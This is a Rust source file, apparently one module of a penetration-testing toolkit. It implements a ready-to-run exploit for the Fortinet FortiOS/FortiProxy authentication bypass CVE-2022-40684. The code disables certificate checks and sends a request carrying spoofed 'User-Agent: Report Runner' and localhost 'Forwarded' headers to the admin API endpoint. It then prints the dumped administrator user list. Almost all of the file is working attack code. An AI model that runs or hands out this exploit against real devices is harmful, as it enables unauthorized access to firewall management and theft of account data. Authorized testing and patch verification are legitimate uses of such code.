use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use serde_json::Value;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target};

/// FortiOS/FortiProxy/FortiSwitchManager Auth Bypass (CVE-2022-40684)
/// 
/// Authentication bypass on the administrative interface via specific HTTP headers,
/// allowing access to the API.
/// 
/// Headers:
/// User-Agent: Report Runner
/// Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000"
/// 
/// Target: /api/v2/cmdb/system/admin (to dump admin users)

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    // This vulnerability is typically on the management interface (HTTPS).
    let base_url = if target_ip.contains("://") {
        target_ip.clone()
    } else {
        format!("https://{}", target_ip)
    };

    println!("{} Target: {}", "[*]".blue(), base_url);
    
    // We try to fetch the list of admin users
    let api_endpoint = format!("{}/api/v2/cmdb/system/admin", base_url.trim_end_matches('/'));
    
    println!("{} Attempting Authentication Bypass...", "[*]".blue());
    println!("{} Sending request to Config API...", "[*]".blue());

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;
        
    let res = client.get(&api_endpoint)
        .header("User-Agent", "Report Runner")
        .header("Forwarded", "for=\"[127.0.0.1]:8000\";by=\"[127.0.0.1]:9000\"")
        .send()
        .await
        .context("Failed to send request")?;
        
    let status = res.status();
    let text = res.text().await?;

    if status.is_success() {
        println!("{} Request successful (HTTP 200)!", "[+]".green());
        println!("{} Bypass worked! Validating output...", "[*]".green());
        
        // Parse JSON output
        match serde_json::from_str::<Value>(&text) {
            Ok(v) => {
                // If it's a valid Forti OS API response, it often has a "results" array
                if let Some(results) = v.get("results") {
                    println!("{} Admin Users Found:\n{:#}", "[+]".green(), results);
                } else if let Some(_key) = v.get("vdom") {
                    // Another potential indication of success
                     println!("{} API Response (Full):\n{:#}", "[+]".green(), v);
                } else {
                    // Fallback
                     println!("{} Raw Response:\n{}", "[*]".blue(), text);
                }
            },
            Err(_) => {
                println!("{} Response is not valid JSON (might be HTML login page?):", "[-]".yellow());
                println!("{}", text.chars().take(500).collect::<String>());
            }
        }
    } else {
        println!("{} Request failed with status: {}", "[-]".red(), status);
        println!("{} This might mean the target is patched or not FortiOS.", "[*]".yellow());
        // Sometimes 403 or 401 is returned even if headers are there, meaning patch is applied.
    }
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║      FortiOS Authentication Bypass (CVE-2022-40684)       ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
